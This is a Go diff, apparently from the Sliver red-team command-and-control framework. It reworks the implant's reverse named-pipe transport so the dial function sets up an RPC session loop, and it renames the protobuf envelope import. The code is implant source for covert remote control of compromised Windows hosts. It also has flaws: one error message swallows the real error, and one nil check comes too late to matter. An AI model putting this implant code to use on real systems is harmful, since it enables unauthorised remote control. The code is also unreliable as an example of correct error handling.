@@ -23,6 +23,7 @@ package transports
 import (
 	"bytes"
 	"encoding/binary"
+	"fmt"
 	"net"
 	"net/url"
 	"strings"
@@ -32,8 +33,9 @@ import (
 	// {{end}}
 
 	"github.com/Microsoft/go-winio"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/golang/protobuf/proto"
+
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 const (
@@ -41,17 +43,32 @@ const (
 	writeBufSizeNamedPipe = 1024
 )
 
-func namePipeDial(uri *url.URL) (net.Conn, error) {
+// namedPipeDial - Reverse Named Pipe implant transport (Windows only)
+func namePipeDial(uri *url.URL) (*Connection, error) {
 	address := uri.String()
 	address = strings.ReplaceAll(address, "namedpipe://", "")
 	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
 	// {{if .Config.Debug}}
 	log.Print("Named pipe address: ", address)
 	// {{end}}
-	return winio.DialPipe(address, nil)
+	conn, err := winio.DialPipe(address, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	// Setup RPC read/write loop over the named pipe.
+	connection, err := setupSessionRPC(conn)
+	if err != nil {
+		return nil, fmt.Errorf("failed to connect over named pipe: %v, err")
+	}
+	if conn == nil {
+		return nil, fmt.Errorf("failed to connect over named pipe (unkown reason)")
+	}
+
+	return connection, nil
 }
 
-func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
+func namedPipeWriteEnvelope(conn *net.Conn, envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -89,7 +106,7 @@ func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
 	return nil
 }
 
-func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
+func namedPipeReadEnvelope(conn *net.Conn) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4)
 	_, err := (*conn).Read(dataLengthBuf)
 	if err != nil {
@@ -116,13 +133,13 @@ func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
 			break
 		}
 	}
-	envelope := &sliverpb.Envelope{}
+	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[namedpipe] Unmarshaling envelope error: %v", err)
 		// {{end}}
-		return &sliverpb.Envelope{}, err
+		return &pb.Envelope{}, err
 	}
 	return envelope, nil
 }
